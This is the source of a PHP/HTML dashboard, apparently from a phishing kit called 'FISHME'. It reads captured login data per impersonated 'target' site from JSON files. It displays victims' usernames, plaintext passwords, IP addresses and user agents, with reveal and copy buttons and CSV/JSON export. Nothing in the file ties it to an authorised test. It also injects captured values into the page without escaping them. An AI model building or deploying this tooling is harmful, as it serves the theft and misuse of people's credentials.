<?php
$captureDir = __DIR__ . '/capture';
$data = [];
$stats = [
    'total' => 0
];

$activeSite = getenv('FISHME_ACTIVE_SITE') ?: null;

if (is_dir($captureDir)) {
    if ($activeSite) {
        // Only load the file for the active site
        $file = $captureDir . '/' . $activeSite . '.json';
        if (file_exists($file)) {
            $content = file_get_contents($file);
            $decoded = json_decode($content, true);
            if (is_array($decoded)) {
                foreach ($decoded as &$row) {
                    $row['template'] = $activeSite;
                    $data[] = $row;
                }
                $stats['total'] = count($decoded);
            }
        }
    } else {
        // Load all files if no active site is set (e.g., when running 'fishme capture')
        $files = glob($captureDir . '/*.json');
        foreach ($files as $file) {
            $site = basename($file, '.json');
            $content = file_get_contents($file);
            $decoded = json_decode($content, true);
            if (is_array($decoded)) {
                foreach ($decoded as &$row) {
                    $row['template'] = $site;
                    $data[] = $row;
                }
                $stats['total'] += count($decoded);
            }
        }
    }
}

// Sort data by timestamp descending
usort($data, function($a, $b) {
    return strtotime($b['timestamp'] ?? 0) - strtotime($a['timestamp'] ?? 0);
});

$jsonData = json_encode($data, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
$statsData = json_encode($stats, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[ FISHME ] — Data Viewer Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Outfit:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background: #0a0d11;
            color: #c9d1d9;
            font-family: 'JetBrains Mono', monospace;
            min-height: 100vh;
            padding: 2rem;
            position: relative;
        }
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background:
                radial-gradient(ellipse at 20% 50%, rgba(0, 255, 136, 0.04) 0%, transparent 60%),
                radial-gradient(ellipse at 80% 20%, rgba(255, 80, 80, 0.05) 0%, transparent 50%);
            pointer-events: none;
            z-index: -1;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 2rem;
            border-bottom: 1px solid #30363d;
            padding-bottom: 1.5rem;
            background: linear-gradient(90deg, rgba(22, 27, 34, 0.8) 0%, rgba(13, 17, 23, 0) 100%);
            padding: 2rem;
            border-radius: 8px 8px 0 0;
            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
        }
        .logo-box {
            display: flex;
            flex-direction: column;
            position: relative;
        }
        .logo-box::before {
            content: '';
            position: absolute;
            left: -20px;
            top: 10px;
            bottom: 10px;
            width: 4px;
            background: #00ff88;
            box-shadow: 0 0 10px rgba(0,255,136,0.5);
            border-radius: 2px;
        }
        .logo-text {
            font-family: 'Outfit', sans-serif;
            font-weight: 700;
            font-size: 2.5rem;
            color: #e6edf3;
            letter-spacing: 0.05em;
            text-shadow: 0 0 20px rgba(255,255,255,0.1);
        }
        .logo-sub {
            font-size: 0.85rem;
            color: #8b949e;
            letter-spacing: 0.15em;
            text-transform: uppercase;
            margin-top: 0.2rem;
        }
        .stats-box {
            display: flex;
            gap: 3rem;
        }
        .stat-item {
            text-align: right;
            background: rgba(0, 0, 0, 0.4);
            padding: 1rem 1.5rem;
            border-radius: 8px;
            border: 1px solid #30363d;
            box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
        }
        .stat-val {
            font-family: 'Outfit', sans-serif;
            font-size: 2rem;
            font-weight: 700;
            color: #ff4444;
            text-shadow: 0 0 15px rgba(255, 68, 68, 0.4);
        }
        .stat-label {
            font-size: 0.75rem;
            color: #8b949e;
            letter-spacing: 0.1em;
            margin-top: 0.3rem;
        }
        
        .controls {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
            background: #161b22;
            padding: 1.2rem 1.5rem;
            border: 1px solid #30363d;
            border-radius: 8px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
        }
        .filter-group {
            display: flex;
            gap: 1.5rem;
            align-items: center;
            flex: 1;
        }
        .active-target {
            font-family: 'Outfit', sans-serif;
            font-size: 1.1rem;
            font-weight: 600;
            color: #58a6ff;
            background: rgba(88, 166, 255, 0.1);
            padding: 0.5rem 1rem;
            border-radius: 4px;
            border: 1px solid rgba(88, 166, 255, 0.3);
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .active-target::before {
            content: '';
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #58a6ff;
            border-radius: 50%;
            box-shadow: 0 0 8px #58a6ff;
        }
        input {
            background: #0d1117;
            border: 1px solid #30363d;
            color: #c9d1d9;
            padding: 0.7rem 1.2rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            border-radius: 6px;
            outline: none;
            width: 350px;
            transition: all 0.2s;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
        }
        input:focus {
            border-color: #00ff88;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.2), 0 0 0 2px rgba(0, 255, 136, 0.2);
        }
        .export-group {
            display: flex;
            gap: 1rem;
        }
        .btn {
            background: #21262d;
            border: 1px solid #30363d;
            color: #e6edf3;
            padding: 0.7rem 1.2rem;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 0.6rem;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        .btn:hover {
            background: #30363d;
            border-color: #8b949e;
            transform: translateY(-1px);
        }
        .btn:active {
            transform: translateY(1px);
        }
        .btn-primary {
            background: rgba(0, 255, 136, 0.1);
            border-color: rgba(0, 255, 136, 0.4);
            color: #00ff88;
        }
        .btn-primary:hover {
            background: rgba(0, 255, 136, 0.2);
            border-color: #00ff88;
            box-shadow: 0 0 15px rgba(0,255,136,0.3);
        }

        .table-container {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 12px 32px rgba(0,0,0,0.4);
        }
        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
        }
        th, td {
            padding: 1.2rem 1.5rem;
            border-bottom: 1px solid #21262d;
            font-size: 0.9rem;
        }
        th {
            background: #161b22;
            color: #8b949e;
            font-weight: 600;
            letter-spacing: 0.1em;
            text-transform: uppercase;
            font-size: 0.8rem;
            border-bottom: 2px solid #30363d;
        }
        tr:hover {
            background: rgba(88, 166, 255, 0.05);
        }
        .col-time { color: #8b949e; white-space: nowrap; }
        .col-site { color: #58a6ff; font-weight: bold; font-family: 'Outfit', sans-serif; letter-spacing: 0.05em; text-transform: uppercase;}
        .col-user { color: #e6edf3; font-weight: bold; font-size: 1rem; }
        .col-pass { color: #ff7b72; font-family: monospace; font-size: 1rem;}
        .col-ip { color: #00ff88; font-weight: bold; }
        
        .empty-state {
            padding: 4rem;
            text-align: center;
            color: #8b949e;
        }
        
        .password-container {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .password-toggle {
            cursor: pointer;
            color: #8b949e;
            font-size: 1rem;
        }
        .password-toggle:hover { color: #c9d1d9; }
        .val-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            min-width: 150px;
        }
        .copy-btn {
            background: none;
            border: none;
            color: #8b949e;
            cursor: pointer;
            padding: 0.2rem;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            opacity: 0.4;
            transition: opacity 0.2s, color 0.2s;
        }
        .copy-btn:hover {
            opacity: 1;
            color: #00ff88;
        }
    </style>
</head>
<body>

<div class="container">
    <header>
        <div class="logo-box">
            <div class="logo-text">FISHME</div>
            <div class="logo-sub">// secure data viewer</div>
        </div>
        <div class="stats-box">
            <div class="stat-item">
                <div class="stat-val" id="stat-total">0</div>
                <div class="stat-label">TOTAL CAPTURES</div>
            </div>
        </div>
    </header>

    <div class="controls">
        <div class="filter-group">
            <?php if ($activeSite): ?>
                <div class="active-target">TARGET: <?php echo strtoupper($activeSite); ?></div>
            <?php endif; ?>
            <input type="text" id="searchInput" placeholder="Search username, password or IP...">
        </div>
        <div class="export-group">
            <button class="btn btn-primary" onclick="exportCSV()">
                <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M.5 9.9a.5.5 0 0 1 .5.5v2.5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-2.5a.5.5 0 0 1 1 0v2.5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2v-2.5a.5.5 0 0 1 .5-.5z"/><path d="M7.646 11.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 10.293V1.5a.5.5 0 0 0-1 0v8.793L5.354 8.146a.5.5 0 1 0-.708.708l3 3z"/></svg>
                Export CSV
            </button>
            <button class="btn" onclick="exportJSON()">
                <svg width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M.5 9.9a.5.5 0 0 1 .5.5v2.5a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-2.5a.5.5 0 0 1 1 0v2.5a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2v-2.5a.5.5 0 0 1 .5-.5z"/><path d="M7.646 11.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 10.293V1.5a.5.5 0 0 0-1 0v8.793L5.354 8.146a.5.5 0 1 0-.708.708l3 3z"/></svg>
                Export JSON
            </button>
        </div>
    </div>

    <div class="table-container">
        <table id="dataTable">
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Template</th>
                    <th>IP Address</th>
                    <th>Username</th>
                    <th>Password</th>
                </tr>
            </thead>
            <tbody id="tableBody">
                <!-- Data will be injected here -->
            </tbody>
        </table>
    </div>
</div>

<script>
    const rawData = <?php echo $jsonData; ?>;
    const statsData = <?php echo $statsData; ?>;
    
    let filteredData = [...rawData];
    let showPasswords = {};

    function init() {
        // Populate stats
        document.getElementById('stat-total').textContent = statsData.total;

        // Add event listeners
        document.getElementById('searchInput').addEventListener('input', applyFilters);

        renderTable();
    }

    function applyFilters() {
        const search = document.getElementById('searchInput').value.toLowerCase();

        filteredData = rawData.filter(row => {
            const matchSearch = search === '' || 
                                (row.username && row.username.toLowerCase().includes(search)) || 
                                (row.password && row.password.toLowerCase().includes(search)) || 
                                (row.ip_address && row.ip_address.toLowerCase().includes(search));
            return matchSearch;
        });

        renderTable();
    }

    function togglePassword(index) {
        showPasswords[index] = !showPasswords[index];
        renderTable();
    }

    function renderTable() {
        const tbody = document.getElementById('tableBody');
        tbody.innerHTML = '';

        if (filteredData.length === 0) {
            tbody.innerHTML = `<tr><td colspan="5"><div class="empty-state">No capture data found matching criteria.</div></td></tr>`;
            return;
        }

        filteredData.forEach((row, index) => {
            const tr = document.createElement('tr');
            
            // Mask password if not toggled
            const passLength = row.password ? row.password.length : 0;
            const displayPass = showPasswords[index] ? row.password : '*'.repeat(Math.min(passLength, 15));
            const toggleIcon = showPasswords[index] ? 'hide' : 'View';

            const copySvg = `<svg width="14" height="14" fill="currentColor" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1h-3a.5.5 0 0 0-.5.5v1a.5.5 0 0 0 .5.5h3a.5.5 0 0 0 .5-.5v-1a.5.5 0 0 0-.5-.5zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/></svg>`;

            const rawUser = (row.username || '').replace(/'/g, "\\'").replace(/"/g, '&quot;');
            const rawPass = (row.password || '').replace(/'/g, "\\'").replace(/"/g, '&quot;');

            tr.innerHTML = `
                <td class="col-time">${row.timestamp || '-'}</td>
                <td class="col-site">[ ${row.template} ]</td>
                <td class="col-ip">${row.ip_address || '-'}</td>
                <td class="col-user">
                    <div class="val-container">
                        <span>${row.username || '-'}</span>
                        ${row.username ? `<button class="copy-btn" onclick="copyText('${rawUser}', this)" title="Copy Username">${copySvg}</button>` : ''}
                    </div>
                </td>
                <td class="col-pass">
                    <div class="val-container">
                        <div class="password-container">
                            <span>${displayPass}</span>
                            <span class="password-toggle" onclick="togglePassword(${index})">${toggleIcon}</span>
                        </div>
                        ${row.password ? `<button class="copy-btn" onclick="copyText('${rawPass}', this)" title="Copy Password">${copySvg}</button>` : ''}
                    </div>
                </td>
            `;
            tbody.appendChild(tr);
        });
    }

    function copyText(text, btn) {
        navigator.clipboard.writeText(text).then(() => {
            const originalHTML = btn.innerHTML;
            btn.innerHTML = `<svg width="14" height="14" fill="#00ff88" viewBox="0 0 16 16"><path d="M10.97 4.97a.75.75 0 0 1 1.07 1.05l-3.99 4.99a.75.75 0 0 1-1.08.02L4.324 8.384a.75.75 0 1 1 1.06-1.06l2.094 2.093 3.473-4.425a.267.267 0 0 1 .02-.022z"/></svg>`;
            setTimeout(() => { btn.innerHTML = originalHTML; }, 1500);
        }).catch(err => {
            console.error('Failed to copy text: ', err);
        });
    }

    function exportCSV() {
        if (filteredData.length === 0) return alert('No data to export.');
        
        const headers = ['Timestamp', 'Template', 'IP Address', 'Username', 'Password', 'User Agent'];
        let csvContent = headers.join(',') + '\n';
        
        filteredData.forEach(row => {
            const values = [
                row.timestamp || '',
                row.template || '',
                row.ip_address || '',
                row.username || '',
                row.password || '',
                row.user_agent || ''
            ];
            
            const escapedValues = values.map(v => {
                const str = String(v).replace(/"/g, '""');
                return `"${str}"`;
            });
            csvContent += escapedValues.join(',') + '\n';
        });

        downloadFile(csvContent, 'fishme_export.csv', 'text/csv;charset=utf-8;');
    }

    function exportJSON() {
        if (filteredData.length === 0) return alert('No data to export.');
        const dataStr = JSON.stringify(filteredData, null, 2);
        downloadFile(dataStr, 'fishme_export.json', 'application/json;charset=utf-8;');
    }

    function downloadFile(content, fileName, mimeType) {
        const blob = new Blob([content], { type: mimeType });
        const link = document.createElement('a');
        if (navigator.msSaveBlob) { // IE 10+
            navigator.msSaveBlob(blob, fileName);
        } else {
            const url = URL.createObjectURL(blob);
            link.setAttribute('href', url);
            link.setAttribute('download', fileName);
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
    }

    // Initialize the application
    init();
</script>

</body>
</html>
